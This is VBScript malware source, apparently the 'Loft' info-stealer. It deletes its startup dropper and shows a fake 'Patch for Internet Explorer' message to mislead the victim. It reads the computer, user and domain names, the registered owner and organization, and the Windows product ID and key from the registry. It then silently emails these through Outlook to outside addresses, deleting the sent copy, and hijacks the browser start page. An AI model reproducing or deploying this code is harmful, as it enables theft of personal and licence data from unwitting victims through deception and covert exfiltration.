   On Error Resume Next
   Set f=CreateObject("Scripting.FileSystemObject")
   Set w=CreateObject("WScript.Shell")
   Set ws=Wscript.CreateObject("WScript.Shell")
   startup=ws.SpecialFolders("Startup")
   If f.FileExists (startup&"\Loft.htm") Then
   f.DeleteFile (startup&"\Loft.htm")
   MsgBox "Patch for Internet Explorer installed",vbinformation,"Patch v1.0"
   MsgBox "You can delete this file",vbinformation,"Patch v1.0"
   End If

   CN=CreateObject("WScript.NetWork").ComputerName
   UN=CreateObject("WScript.NetWork").UserName
   UD=CreateObject("WScript.NetWork").UserDomain
   NOM=w.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
   ENT=w.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization")
   PI=w.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\ProductId")
   PK=w.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\ProductKey")
   V=w.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\Version")
   VN=w.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\VersionNumber")
   P=w.RegRead("HKCU\Software\Microsoft\Internet Explorer\International\AcceptLanguage")

   Set O=CreateObject("Outlook.Application")
   Set m=O.CreateItem(0)
   m.To = "loftptk@multimania.com"
   m.BCC = "petik@multimania.com; euphoria@ctw.net"
   m.Subject="Loft Info arrivant de " & P
   n = "Date : " & date
   n = n & VbCrLf & "Heure : " & time
   n = n & VbCrLf & "Nom d'enregistrement : " & NOM
   n = n & VbCrLf & "Nom de l'organization : " & ENT
   n = n & VbCrLf & "Numéro d'identification : " & PI
   n = n & VbCrLf & "Numéro d'enregistrement : " & PK
   n = n & VbCrLf & "Version de Windows : " & V & " " & VN
   n = n & VbCrLf & "Nom de l'ordinateur : " & CN
   n = n & VbCrLf & "Nom de domaine : " & UD
   n = n & VbCrLf & "Nom d'utilisateur : " & UN
   m.Body = n
   m.DeleteAfterSubmit=True
   m.Send

   w.RegWrite "HKCU\Software\Microsoft\PetiK\LoftInfo","OK"
   w.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.yahoo.fr"
